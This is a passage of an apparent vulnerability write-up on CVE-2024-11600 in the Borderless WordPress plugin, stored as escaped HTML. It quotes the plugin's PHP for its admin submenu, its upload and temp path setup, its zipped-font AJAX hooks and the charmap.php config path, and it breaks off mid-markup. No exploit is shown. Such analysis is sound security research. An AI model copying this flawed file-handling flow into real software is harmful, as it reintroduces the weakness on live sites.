1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a submenu:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;borderless_icon_fonts_submenu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_manager_page&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_submenu_page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Icon&amp;ensp;Fonts&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;borderless&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Icon&amp;ensp;Fonts&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;borderless&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;manage_options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless-fonts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless_custom_icons_menu&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$Borderless_IF&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Borderless_IF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin_print_styles-&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$icon_manager_page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$Borderless_IF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin_scripts&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;Icon&amp;ensp;Fonts&#39;&lt;/code&gt;: submenu title&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;manage_options&#39;&lt;/code&gt;: this menu is for Administrators only&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless-fonts&#39;&lt;/code&gt;: menu slug&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Corresponding in the Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; title=&#34;Menu in the Admin Dashboard&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/dashboard.png&#34; data-sub-html=&#34;&lt;h2&gt;Dashboard&lt;/h2&gt;&lt;p&gt;Menu in the Admin Dashboard&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/dashboard.png&#39; alt=&#34;Dashboard&#34; height=&#34;523&#34; width=&#34;1864&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Menu in the Admin Dashboard&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;&#39;borderless_custom_icons_menu&#39;&lt;/code&gt;: callback executed when accessing the menu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;borderless_custom_icons_menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$Borderless_IF&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Borderless_IF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$Borderless_IF&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;icon_pack_manager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, a &lt;code&gt;Borderless_IF&lt;/code&gt; object is instantiated:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Borderless_IF&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_upload_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fonts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless_icon_fonts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;temp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fonts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless_temp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fontdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;basedir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fonts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;basedir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;temp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fonturl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;set_url_scheme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;baseurl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fonts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempurl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;baseurl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;temp&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;config&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;charmap.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_borderless_ajax_add_zipped_font&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;add_zipped_font&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wp_ajax_borderless_ajax_remove_zipped_font&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;remove_zipped_font&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The constructor initializes the necessary paths and hooks. The &lt;code&gt;write_config()&lt;/code&gt; function uses these paths to build the configuration file path:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$charmap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;config&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span 